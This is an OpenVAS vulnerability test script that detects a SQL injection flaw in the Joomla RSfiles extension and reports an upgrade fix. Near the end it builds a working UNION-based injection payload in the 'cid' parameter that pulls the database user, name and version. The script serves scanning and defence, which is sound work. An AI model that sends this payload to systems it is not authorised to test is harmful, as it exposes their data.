###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_rsfiles_sql_inj_vuln.nasl 3557 2016-06-20 08:07:14Z benallard $
#
# Joomla RSfiles SQL Injection Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to inject or
manipulate SQL queries in the back-end database, allowing for the manipulation
or disclosure of arbitrary data.

Impact Level: Application";

tag_affected = "Joomla RSfiles";

tag_insight = "Input passed via the 'cid' GET parameter to index.php (when
'option' is set to 'com_rsfiles', 'view' is set to 'files', 'layout' is set to
'agreement', and 'tmpl' is set to 'component') is not properly sanitised before
being used in a SQL query.";

tag_solution = "Upgrade to Joomla RSfiles REV 12 or later. 
For updates refer http://www.rsjoomla.com/joomla-extensions/joomla-download-manager.html";

tag_summary = "This host is installed with Joomla RSfiles and is prone to sql
injection vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803441";
CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 3557 $");
  script_bugtraq_id(58547);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2016-06-20 10:07:14 +0200 (Mon, 20 Jun 2016) $");
  script_tag(name:"creation_date", value:"2013-03-20 15:59:21 +0530 (Wed, 20 Mar 2013)");
  script_name("Joomla RSfiles SQL Injection Vulnerabilities");

  script_xref(name : "URL" , value : "http://secunia.com/advisories/52668");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/24851");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/52668");
  script_xref(name : "URL" , value : "http://www.madleets.com/Thread-Joomla-Component-RSfiles-cid-SQL-injection-Vulnerability");
  script_summary("Check if Joomla RSfiles is vulnerable sql injection");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_mandatory_keys("joomla/installed");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
dir = "";
port = "";

## Get HTTP Port
port = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port)){
  exit(0);
}

## Construct attack request
url = string(dir, "/index.php?option=com_rsfiles&view=files&layout=agreement&",
                  "tmpl=component&cid=1/**/aNd/**/1=0/**/uNioN++sElecT+1,CONC",
                  "AT_WS(CHAR(32,58,32),user(),database(),version())--");

## Check the response to confirm vulnerability
if(http_vuln_check(port:port, url:url, check_header:TRUE,
      pattern:"File:", extra_check:make_list("I Agree", "I Disagree")))
{
  security_message(port);
  exit(0);
}
